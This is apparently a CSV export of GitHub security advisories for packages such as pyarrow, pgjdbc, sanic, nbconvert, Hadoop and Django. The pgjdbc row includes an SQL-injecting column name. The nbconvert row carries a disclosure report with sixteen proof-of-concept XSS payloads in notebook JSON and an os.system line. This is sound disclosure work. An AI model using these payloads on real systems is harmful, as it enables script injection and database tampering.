2950,20366,pyarrow,GHSA-cjw4-2w9r-r8mv,CVE-2019-12410,https://github.com/advisories/GHSA-cjw4-2w9r-r8mv,high,2022-05-24 17:00:40 UTC,Missing Initialization of Resource in Apache Arrow,"While investigating UBSAN errors in https://github.com/apache/arrow/pull/5365 it was discovered Apache Arrow versions 0.12.0 to 0.14.1, left memory Array data uninitialized when reading RLE null data from parquet. This affected the C++, Python, Ruby and R implementations. The uninitialized memory could potentially be shared if are transmitted over the wire (for instance with Flight) or persisted in the streaming IPC and file formats.",pip
2951,34022,org.postgresql:postgresql,GHSA-r38f-c4h4-hqq2,CVE-2022-31197,https://github.com/advisories/GHSA-r38f-c4h4-hqq2,high,2022-08-06 05:51:38 UTC,PostgreSQL JDBC Driver SQL Injection in ResultSet.refreshRow() with malicious column names,"### Impact

The PGJDBC implementation of the `java.sql.ResultRow.refreshRow()` method is not performing escaping of column names so a malicious column name that contains a statement terminator, e.g. `;`, could lead to SQL injection. This could lead to executing additional SQL commands as the application's JDBC user.

User applications that do not invoke the `ResultSet.refreshRow()` method are not impacted.

User application that do invoke that method are impacted if the underlying database that they are querying via their JDBC application may be under the control of an attacker. The attack requires the attacker to trick the user into executing SQL against a table name who's column names would contain the malicious SQL and subsequently invoke the `refreshRow()` method on the ResultSet.

For example:

```sql
CREATE TABLE refresh_row_example (
  id     int PRIMARY KEY,
  ""1 FROM refresh_row_example; SELECT pg_sleep(10); SELECT * "" int
);
```

This example has a table with two columns. The name of the second column is crafted to contain a statement terminator followed by additional SQL. Invoking the `ResultSet.refreshRow()` on a ResultSet that queried this table, e.g. `SELECT * FROM refresh_row`, would cause the additional SQL commands such as the `SELECT pg_sleep(10)` invocation to be executed.

As the multi statement command would contain multiple results, it would not be possible for the attacker to get data directly out of this approach as the `ResultSet.refreshRow()` method would throw an exception. However, the attacker could execute any arbitrary SQL including inserting the data into another table that could then be read or any other DML / DDL statement.

Note that the application's JDBC user and the schema owner need not be the same. A JDBC application that executes as a privileged user querying database schemas owned by potentially malicious less-privileged users would be vulnerable. In that situation it may be possible for the malicious user to craft a schema that causes the application to execute commands as the privileged user.

### Patches

Versions 42.2.26, 42.3.7, and 42.4.1 have been released with a fix.

### Workarounds

Check that you are not using the `ResultSet.refreshRow()` method.

If you are, ensure that the code that executes that method does not connect to a database that is controlled by an unauthenticated or malicious user. If your application only connects to its own database with a fixed schema with no DDL permissions, then you will not be affected by this vulnerability as it requires a maliciously crafted schema.
",maven
2952,20197,sanic,GHSA-8cw9-5hmv-77w6,CVE-2022-35920,https://github.com/advisories/GHSA-8cw9-5hmv-77w6,high,2022-08-06 05:21:19 UTC,sanic vulnerable to Path Traversal when using `app.static` if using encoded `%2F` URLs,"### Impact
Access to lateral directories when using `app.static` if using encoded `%2F` URLs. Parent directory traversal is not impacted.

### Patches
- v20.12.7 (LTS)
- v21.12.2 (LTS)
- v22.6.1

### References
https://github.com/sanic-org/sanic/issues/2478
https://github.com/sanic-org/sanic/pull/2495

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [the community forums](https://community.sanicframework.org/)
* Ping us on [the Discord server](https://discord.gg/FARQzAEMAA)

",pip
2953,20194,pyspark,GHSA-4x9r-j582-cgr8,CVE-2022-33891,https://github.com/advisories/GHSA-4x9r-j582-cgr8,high,2022-07-19 00:00:29 UTC,Apache Spark UI code path in HttpSecurityFilter can allow impersonation if ACLs enabled,"The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.",pip
2954,20059,nbconvert,GHSA-9jmq-rx5f-8jwq,CVE-2021-32862,https://github.com/advisories/GHSA-9jmq-rx5f-8jwq,moderate,2022-08-10 17:51:53 UTC,nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths,"Cross-linking to https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm

Most of the fixes will be in this repo, though, so having it here gives us the private fork to work on patches

Below is currently a duplicate of the original report:

----

Received on security@ipython.org unedited, I'm not sure if we want to make it separate advisories. 

Pasted raw for now, feel free to edit or make separate advisories if you have the rights to. 

I think the most important is to switch back from nbviewer.jupyter.org -> nbviewer.org at the cloudflare level I guess ? There might be fastly involved as well.
--- 
### Impact
_What kind of vulnerability is it? Who is impacted?_

### Patches
_Has the problem been patched? What versions should users upgrade to?_

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)

--- 

# GitHub Security Lab (GHSL) Vulnerability Report

The [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [nbconvert](https://github.com/jupyter/nbconvert).

We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2021-1013`, `GHSL-2021-1014`, `GHSL-2021-1015`, `GHSL-2021-1016`, `GHSL-2021-1017`, `GHSL-2021-1018`, `GHSL-2021-1019`, `GHSL-2021-1020`, `GHSL-2021-1021`, `GHSL-2021-1022`, `GHSL-2021-1023`, `GHSL-2021-1024`, `GHSL-2021-1025`, `GHSL-2021-1026`, `GHSL-2021-1027` or `GHSL-2021-1028` as a reference).

If you are _NOT_ the correct point of contact for this report, please let us know!

## Summary

When using nbconvert to generate an HTML version of a user-controllable notebook, it is possible to inject arbitrary HTML which may lead to Cross-Site Scripting (XSS) vulnerabilities if these HTML notebooks are served by a web server (eg: nbviewer) 

## Product

nbconvert

## Tested Version

[v5.5.0](https://github.com/jupyter/nbconvert/releases/tag/5.5.0)

## Details

### Issue 1: XSS in notebook.metadata.language_info.pygments_lexer (`GHSL-2021-1013`)

Attacker in control of a notebook can inject arbitrary unescaped HTML in the `notebook.metadata.language_info.pygments_lexer` field such as the following:

```json
""metadata"": {
  ""language_info"": {
   ""pygments_lexer"": ""ipython3-foo\""><script>alert(1)</script>""
  }
}
```

This node is read in the [`from_notebook_node`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/exporters/html.py#L135-L140) method:

```python
def from_notebook_node(self, nb, resources=None, **kw):
  langinfo = nb.metadata.get('language_info', {})
  lexer = langinfo.get('pygments_lexer', langinfo.get('name', None))
  highlight_code = self.filters.get('highlight_code', Highlight2HTML(pygments_lexer=lexer, parent=self))
  self.register_filter('highlight_code', highlight_code)
  return super().from_notebook_node(nb, resources, **kw)
```

It is then assigned to `language` var and passed down to [`_pygments_highlight`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L90)

```python
from pygments.formatters import LatexFormatter
if not language:
  language=self.pygments_lexer
latex = _pygments_highlight(source, LatexFormatter(), language, metadata)
```

In this method, the `language` variable is [concatenated to `highlight hl-` string to conform the `cssclass`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/nbconvert/filters/highlight.py#L56) passed to the `HTMLFormatter` constructor:

``` python
return _pygments_highlight(source if len(source) > 0 else ' ',
  # needed to help post processors:
  HtmlFormatter(cssclass="" highlight hl-""+language),
  language, metadata)
```

The `cssclass` variable is then [concatenated in the outer div class attribute](https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L791)

``` python
yield 0, ('<div' + (self.cssclass and ' class=""%s""' % self.cssclass) + (style and (' style=""%s""' % style)) + '>')
```

Note that the `cssclass` variable is also used in other unsafe places such as [`'<table class=""%stable"">' % self.cssclass + filename_tr +`](https://github.com/pygments/pygments/blob/30cfa26201a27dee1f8e6b0d600cad1138e64507/pygments/formatters/html.py#L711))

### Issue 2: XSS in notebook.metadata.title (`GHSL-2021-1014`)

The `notebook.metadata.title` node is rendered directly to the [`index.html.j2`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13) HTML template with no escaping: 

```html
{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}
<title>{{nb_title}}</title>
```

The following `notebook.metadata.title` node will execute arbitrary javascript:

```json
 ""metadata"": {
  ""title"": ""TITLE</title><script>alert(1)</script>""
 }
```

Note: this issue also affect other templates, not just the `lab` one.

### Issue 3: XSS in notebook.metadata.widgets(`GHSL-2021-1015`)

The `notebook.metadata.widgets` node is rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13) HTML template with no escaping: 

```html
{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}
{% if mimetype in nb.metadata.get(""widgets"",{})%}
<script type=""{{ mimetype }}"">
{{ nb.metadata.widgets[mimetype] | json_dumps }}
</script>
{% endif %}
```

The following `notebook.metadata.widgets` node will execute arbitrary javascript:

```json
 ""metadata"": {
  ""widgets"": {
    ""application/vnd.jupyter.widget-state+json"": {""foo"": ""pwntester</script><script>alert(1);//""}
  }
 }
```

Note: this issue also affect other templates, not just the `lab` one.

### Issue 4: XSS in notebook.cell.metadata.tags(`GHSL-2021-1016`)

The `notebook.cell.metadata.tags` nodes are output directly to the [`celltags.j2`](https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4) HTML template with no escaping: 

```
{%- macro celltags(cell) -%}
    {% if cell.metadata.tags | length > 0 -%}
        {% for tag in cell.metadata.tags -%}
            {{ ' celltag_' ~ tag -}}
        {%- endfor -%}
    {%- endif %}
{%- endmacro %}
```

The following `notebook.cell.metadata.tags` node will execute arbitrary javascript:

```json
  {
   ""cell_type"": ""code"",
   ""execution_count"": null,
   ""id"": ""727d1a5f"",
   ""metadata"": {
     ""tags"": [""FOO\""><script>alert(1)</script><div \""""]
   },
   ""outputs"": [],
   ""source"": []
  }
 ],
```

Note: this issue also affect other templates, not just the `lab` one.

### Issue 5: XSS in output data text/html cells(`GHSL-2021-1017`)

Using the `text/html` output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:

The following is an example of a cell with `text/html` output executing arbitrary javascript code:

```json
  {
   ""cell_type"": ""code"",
   ""execution_count"": 5,
   ""id"": ""b72e53fa"",
   ""metadata"": {},
   ""outputs"": [
    {
     ""data"": {
      ""text/html"": [
        ""<script>alert(1)</script>""
      ]
     },
     ""execution_count"": 5,
     ""metadata"": {},
     ""output_type"": ""execute_result""
    }
   ],
   ""source"": [
    ""import os; os.system('touch /tmp/pwned')""
   ]
  },
```

### Issue 6: XSS in output data image/svg+xml cells(`GHSL-2021-1018`)

Using the `image/svg+xml` output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. 

The `cell.output.data[""image/svg+xml""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping

```
{%- else %}
{{ output.data['image/svg+xml'] }}
{%- endif %}
```

The following `cell.output.data[""image/svg+xml""]` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""image/svg+xml"": [""<script>console.log(\""image/svg+xml output\"")</script>""]
     },
     ""execution_count"": null,
     ""metadata"": {
     }
    }
```

### Issue 7: XSS in notebook.cell.output.svg_filename(`GHSL-2021-1019`)

The `cell.output.svg_filename` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping

```
{%- if output.svg_filename %}
<img src=""{{ output.svg_filename | posix_path }}"">
```

The following `cell.output.svg_filename` node will escape the `img` tag context and execute arbitrary javascript:

```json
  {
   ""cell_type"": ""code"",
   ""execution_count"": null,
   ""id"": ""b72e53fa"",
   ""metadata"": {},
   ""outputs"": [
    {
     ""output_type"": ""execute_result"",
     ""svg_filename"": ""\""><script>alert(1)</script>"",
     ""data"": {
      ""image/svg+xml"": [""""]
     },
     ""execution_count"": null,
     ""metadata"": {
     }
    }
   ],
   ""source"": [""""]
  },
```

### Issue 8: XSS in output data text/markdown cells(`GHSL-2021-1020`)

Using the `text/markdown` output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. 

The `cell.output.data[""text/markdown""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping

```
{{ output.data['text/markdown'] | markdown2html }}
```

The following `cell.output.data[""text/markdown""]` node will execute arbitrary javascript:

```
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""text/markdown"": [""<script>console.log(\""text/markdown output\"")</script>""]
     },
     ""execution_count"": null,
     ""metadata"": {}
    }
```

### Issue 9: XSS in output data application/javascript cells(`GHSL-2021-1021`)

Using the `application/javascript` output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:

The `cell.output.data[""application/javascript""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping

```
<script type=""text/javascript"">
var element = document.getElementById('{{ div_id }}');
{{ output.data['application/javascript'] }}
</script>
```

The following `cell.output.data[""application/javascript""]` node will execute arbitrary javascript:

```
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""application/javascript"": [""console.log(\""application/javascript output\"")""]
     },
     ""execution_count"": null,
     ""metadata"": {}
    }
```

### Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(`GHSL-2021-1022`)

The `cell.output.metadata.filenames[""images/png""]` and `cell.metadata.filenames[""images/jpeg""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping:

```
{%- if 'image/png' in output.metadata.get('filenames', {}) %}
<img src=""{{ output.metadata.filenames['image/png'] | posix_path }}""
```

The following `filenames` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""image/png"": [""""]
     },
     ""execution_count"": null,
     ""metadata"": {
       ""filenames"": {
          ""image/png"": ""\""><script>console.log(\""output.metadata.filenames.image/png injection\"")</script>"" 
       }
     }
    }
```

### Issue 11: XSS in output data image/png and image/jpeg cells(`GHSL-2021-1023`)

Using the `image/png` or `image/jpeg` output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. 

The `cell.output.data[""images/png""]` and `cell.output.data[""images/jpeg""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping:

```
{%- else %}
<img src=""data:image/png;base64,{{ output.data['image/png'] }}""
{%- endif %}
```

The following `cell.output.data[""image/png""]` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""image/png"": [""\""><script>console.log(\""image/png output\"")</script>""]
     },
     ""execution_count"": null,
     ""metadata"": {}
    }
```

### Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(`GHSL-2021-1024`)

The `cell.output.metadata.width` and `cell.output.metadata.height` nodes of both `image/png` and `image/jpeg` cells are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping:

```
{%- set width=output | get_metadata('width', 'image/png') -%}
width={{ width }}
{%- set height=output | get_metadata('height', 'image/png') -%}
height={{ height }}
```

The following `output.metadata.width` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""image/png"": [""abcd""]
     },
     ""execution_count"": null,
     ""metadata"": {
        ""width"": ""><script>console.log(\""output.metadata.width png injection\"")</script>""
     }
    }
```

### Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(`GHSL-2021-1025`)

The `cell.output.data[""application/vnd.jupyter.widget-state+json""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping:

```
{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
<script type=""{{ datatype }}"">
{{ output.data[datatype] | json_dumps }}
</script>
```

The following `cell.output.data[""application/vnd.jupyter.widget-state+json""]` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""application/vnd.jupyter.widget-state+json"": ""\""</script><script>console.log('output.data.application/vnd.jupyter.widget-state+json injection')//""
     },
     ""execution_count"": null,
     ""metadata"": {}
    }
```

### Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(`GHSL-2021-1026`)

The `cell.output.data[""application/vnd.jupyter.widget-view+json""]` nodes are rendered directly to the [`base.html.j2`](https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2) HTML template with no escaping:

```
{% set datatype_list = output.data | filter_data_type %}
{% set datatype = datatype_list[0]%}
<script type=""{{ datatype }}"">
{{ output.data[datatype] | json_dumps }}
</script>
```

The following `cell.output.data[""application/vnd.jupyter.widget-view+json""]` node will execute arbitrary javascript:

```json
    {
     ""output_type"": ""execute_result"",
     ""data"": {
      ""application/vnd.jupyter.widget-view+json"": ""\""</script><script>console.log('output.data.application/vnd.jupyter.widget-view+json injection')//""
     },
     ""execution_count"": null,
     ""metadata"": {}
    }
```


### Issue 15: XSS in raw cells(`GHSL-2021-1027`)

Using a `raw` cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:

The following is an example of a `raw` cell executing arbitrary javascript code:

```json
  {
   ""cell_type"": ""raw"",
   ""id"": ""372c2bf1"",
   ""metadata"": {},
   ""source"": [
    ""Payload in raw cell <script>alert(1)</script>""
   ]
  }
```

### Issue 16: XSS in markdown cells(`GHSL-2021-1028`)

Using a `markdown` cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:

The following is an example of a `markdown` cell executing arbitrary javascript code:

```json
  {
   ""cell_type"": ""markdown"",
   ""id"": ""2d42de4a"",
   ""metadata"": {},
   ""source"": [
     ""<script>alert(1)</script>""
   ]
  },
```

### Proof of Concept

These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example [nbviewer](https://nbviewer.jupyter.org) is vulnerable to the above mentioned XSS issues:

1. Create Gist with payload. eg:
- `https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c`

2. Then load gist on nbviewer. eg:
- `https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c`

Note: response is served with `content-security-policy: connect-src 'none';`

## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

These issues were discovered and reported by GHSL team member [@pwntester (Alvaro Muñoz)](https://github.com/pwntester).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-1013`, `GHSL-2021-1014`, `GHSL-2021-1015`, `GHSL-2021-1016`, `GHSL-2021-1017`, `GHSL-2021-1018`, `GHSL-2021-1019`, `GHSL-2021-1020`, `GHSL-2021-1021`, `GHSL-2021-1022`, `GHSL-2021-1023`, `GHSL-2021-1024`, `GHSL-2021-1025`, `GHSL-2021-1026`, `GHSL-2021-1027` or `GHSL-2021-1028` in any communication regarding these issues.


## Disclosure Policy

This report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).
",pip
2955,13303,System.Security.Cryptography.Xml,GHSA-2m65-m22p-9wjw,CVE-2022-34716,https://github.com/advisories/GHSA-2m65-m22p-9wjw,moderate,2022-08-10 00:00:18 UTC,.NET Information Disclosure Vulnerability,"Microsoft is releasing this security advisory to provide information about a vulnerability in .NET Core 3.1 and .NET 6.0.  An information disclosure vulnerability exists in .NET Core 3.1 and .NET 6.0 that could lead to unauthorized access of privileged information.

## Affected software

* Any .NET 6.0 application running on .NET 6.0.7 or earlier.
* Any .NET Core 3.1 applicaiton running on .NET Core 3.1.27 or earlier.

## Patches

* If you're using .NET 6.0, you should download and install Runtime 6.0.8 or SDK 6.0.108 (for Visual Studio 2022 v17.1) from https://dotnet.microsoft.com/download/dotnet-core/6.0.
* If you're using .NET Core 3.1, you should download and install Runtime 3.1.28 (for Visual Studio 2019 v16.9) from https://dotnet.microsoft.com/download/dotnet-core/3.1.",nuget
2956,34046,org.apache.hadoop:hadoop-common,GHSA-8wm5-8h9c-47pc,CVE-2022-25168,https://github.com/advisories/GHSA-8wm5-8h9c-47pc,critical,2022-08-05 00:00:24 UTC,Apache Hadoop argument injection vulnerability,"Apache Hadoop's `FileUtil.unTar(File, File)` API does not escape the input file name before being passed to the shell. An attacker can inject arbitrary commands. This is only used in Hadoop 3.3 InMemoryAliasMap.completeBootstrapTransfer, which is only ever run by a local user. It has been used in Hadoop 2.x for yarn localization, which does enable remote code execution. It is used in Apache Spark, from the SQL command ADD ARCHIVE. As the ADD ARCHIVE command adds new binaries to the classpath, being able to execute shell scripts does not confer new permissions to the caller. SPARK-38305. ""Check existence of file before untarring/zipping"", which is included in 3.3.0, 3.1.4, 3.2.2, prevents shell commands being executed, regardless of which version of the hadoop libraries are in use. Users should upgrade to Apache Hadoop 2.10.2, 3.2.4, 3.3.3 or upper (including HADOOP-18136).",maven
2957,19832,Django,GHSA-8x94-hmjh-97hq,CVE-2022-36359,https://github.com/advisories/GHSA-8x94-hmjh-97hq,high,2022-08-11 14:49:12 UTC,Django vulnerable to Reflected File Download attack,An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.,pip
2958,37484,io.socket:socket.io-client,GHSA-85xx-xhjm-rhrw,CVE-2022-25867,https://github.com/advisories/GHSA-85xx-xhjm-rhrw,high,2022-08-03 00:00:57 UTC,Socket.IO-client Java before 2.0.1 vulnerable to NULL Pointer Dereference,The package io.socket:socket.io-client before 2.0.1 is vulnerable to NULL Pointer Dereference when parsing a packet with with invalid payload format.,maven
2959,15795,eslint,GHSA-jcgq-xh2f-2hfm,,https://github.com/advisories/GHSA-jcgq-xh2f-2hfm,moderate,2021-02-25 01:20:42 UTC,Regular Expression Denial of Service,A vulnerability was descovered in eslint before 4.18.2. One of the regexes in eslint is vulnerable to catastrophic backtracking.,npm
2960,17429,ecstatic,GHSA-x4rf-4mqf-cm8w,,https://github.com/advisories/GHSA-x4rf-4mqf-cm8w,moderate,2020-08-19 22:44:22 UTC,Open Redirect in ecstatic,Withdrawn: Duplicate of GHSA-9q64-mpxx-87fg,npm
2961,16248,parcel-bundler,GHSA-5j4m-89xf-mf5p,,https://github.com/advisories/GHSA-5j4m-89xf-mf5p,moderate,2020-08-27 22:58:46 UTC,Missing Origin Validation in parcel-bundler,Withdrawn: Duplicate of GHSA-37q6-576q-vgr7,npm
2962,17908,jwt-simple,GHSA-chgg-rrmv-5q7x,,https://github.com/advisories/GHSA-chgg-rrmv-5q7x,moderate,2020-08-03 18:05:48 UTC,Withdrawn,Withdrawn: Duplicate of GHSA-vgrx-w6rg-8fqf,npm
2963,16013,handlebars,GHSA-6r5x-hmgg-7h53,,https://github.com/advisories/GHSA-6r5x-hmgg-7h53,moderate,2019-07-15 19:46:01 UTC,Remote code execution in Handlebars.js,Handlebars.js before 4.1.0 has Remote Code Execution (RCE),npm
2964,17733,sails,GHSA-j95h-wmx9-4279,,https://github.com/advisories/GHSA-j95h-wmx9-4279,high,2021-02-25 17:15:39 UTC,Denial of Service,"
**Withdrawn:** Duplicate of GHSA-j95h-wmx9-4279.

Affected versions of the package are vulnerable to a Denial of Service attack sending an OPTIONS request for an undefined route.",npm
2965,16065,marked,GHSA-wjmf-58vc-xqjr,,https://github.com/advisories/GHSA-wjmf-58vc-xqjr,moderate,2021-02-25 02:01:56 UTC,Content injection in marked,Versions 0.3.7 and earlier of marked When mangling is disabled via option mangle don't escape target href. This allow attacker to inject arbitrary html-event into resulting a tag.,npm
2966,16065,marked,GHSA-7m7q-q53v-j47v,,https://github.com/advisories/GHSA-7m7q-q53v-j47v,moderate,2021-02-25 02:01:47 UTC,Regular Expression Denial of Service,"A flaw was found in nodejs-marked versions from 0.5.0 to before 0.6.1. Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). Input to the host variable is vulnerable when input contains parenthesis in link URIs, coupled with a high number of link tokens in a single line.",npm
2967,16065,marked,GHSA-8wp3-cp9v-44fm,,https://github.com/advisories/GHSA-8wp3-cp9v-44fm,moderate,2021-02-25 02:01:15 UTC,Cross-Site Scripting in marked,Versions 0.3.7 and earlier of marked unescape only lowercase while owsers support both lowercase and uppercase x in hexadecimal form of HTML character entity,npm
2968,16784,protobufjs,GHSA-4gpv-cvmq-6526,,https://github.com/advisories/GHSA-4gpv-cvmq-6526,moderate,2020-08-19 22:23:09 UTC,Denial of Service in protobufjs,Withdrawn: Duplicate of GHSA-762f-c2wg-m8c8,npm
2969,17334,https-proxy-agent,GHSA-qrg3-f6h6-vq8q,,https://github.com/advisories/GHSA-qrg3-f6h6-vq8q,high,2020-08-19 22:15:57 UTC,Denial of Service in https-proxy-agent,Withdrawn: Duplicate of GHSA-8g7p-74h8-hg48,npm
2970,39611,org.jpmml:pmml-model,GHSA-c8m9-mh38-97p9,,https://github.com/advisories/GHSA-c8m9-mh38-97p9,high,2021-02-24 19:40:41 UTC,XML external entity (XXE) vulnerability,An XML eXternal Entity (XXE) Injection was discovered in pmml-model before version 1.4.3. A remote attacker can exploit this vulnerability by sending a request to submit malicious External Entity references within the embedded XML metadata to the target system.,maven
2971,27363,devise_invitable,GHSA-wj5j-xpcj-45gc,,https://github.com/advisories/GHSA-wj5j-xpcj-45gc,moderate,2021-02-24 19:17:37 UTC,Cross-Site Request Forgery (CSRF),"# Withdrawn

Affected versions of the package are vulnerable to Cross-Site Request Forgery (CSRF) attacks.",rubygems
2972,18540,is-my-json-valid,GHSA-4x7c-cx64-49w8,,https://github.com/advisories/GHSA-4x7c-cx64-49w8,low,2020-08-19 22:06:03 UTC,Regular Expression Denial of Service in is-my-json-valid,Withdrawn: Duplicate of GHSA-f522-ffg8-j8r6,npm
2973,17681,highcharts,GHSA-m45f-4828-5cv5,,https://github.com/advisories/GHSA-m45f-4828-5cv5,moderate,2020-08-19 22:39:44 UTC,Regular Expression Denial of Service in highcharts,Withdrawn: Duplicate of GHSA-xmc8-cjfr-phx3,npm
2974,16065,marked,GHSA-32vw-r77c-gm67,,https://github.com/advisories/GHSA-32vw-r77c-gm67,moderate,2020-08-03 17:57:05 UTC,Moderate severity vulnerability that affects marked,Versions 0.3.2 and earlier of marked are affected by a cross-site scripting vulnerability even when sanitize:true is set.,npm
2975,28908,flower,GHSA-94ww-22rx-493x,,https://github.com/advisories/GHSA-94ww-22rx-493x,moderate,2021-02-24 19:46:35 UTC,Cross-Site Scripting,"Flower, before 0.9.2, has a XSS on tasks page because data is not properly escaped.",pip
2976,19870,djangorestframework,GHSA-57h7-r3q3-w57j,,https://github.com/advisories/GHSA-57h7-r3q3-w57j,moderate,2021-02-24 19:46:00 UTC,Cross-Site Scripting,"Django-Rest-Framework, before 3.9.1, has a XSS vulnerability caused by disabled autoescaping in the default DRF Browsable API view templates.",pip
2977,20100,autobahn,GHSA-xm8r-5wh6-f46f,,https://github.com/advisories/GHSA-xm8r-5wh6-f46f,low,2021-02-24 19:45:15 UTC,Timing attack,"While each ID is used for only one authentication attempt, a timing attack is possible to figure out in Autobahn.",pip
2978,35640,org.bitbucket.b_c:jose4j,GHSA-h6wq-jw7q-grxv,,https://github.com/advisories/GHSA-h6wq-jw7q-grxv,high,2021-02-24 19:38:21 UTC,Elliptic Curve Key Disclosure,Affected versions of the package are vulnerable to Elliptic Curve Key Disclosure.,maven
2979,18032,knockout,GHSA-qfmr-6qvh-49gm,,https://github.com/advisories/GHSA-qfmr-6qvh-49gm,moderate,2021-02-25 01:44:38 UTC,XSS,"**Withdrawn:** Duplicate of GHSA-vcjj-xf2r-mwvc.

Knockout, before 3.5.0-beta, has an XSS injection point in attr name binding for browser IE7 and older.",npm
2980,18068,openzeppelin-solidity,GHSA-7grf-83vw-6f5x,CVE-2022-35915,https://github.com/advisories/GHSA-7grf-83vw-6f5x,moderate,2022-08-14 00:23:34 UTC,OpenZeppelin Contracts ERC165Checker unbounded gas consumption,"### Impact

The target contract of an EIP-165 `supportsInterface` query can cause unbounded gas consumption by returning a lot of data, while it is generally assumed that this operation has a bounded cost.

### Patches

The issue has been fixed in v4.7.2.

### References

https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3587

### For more information

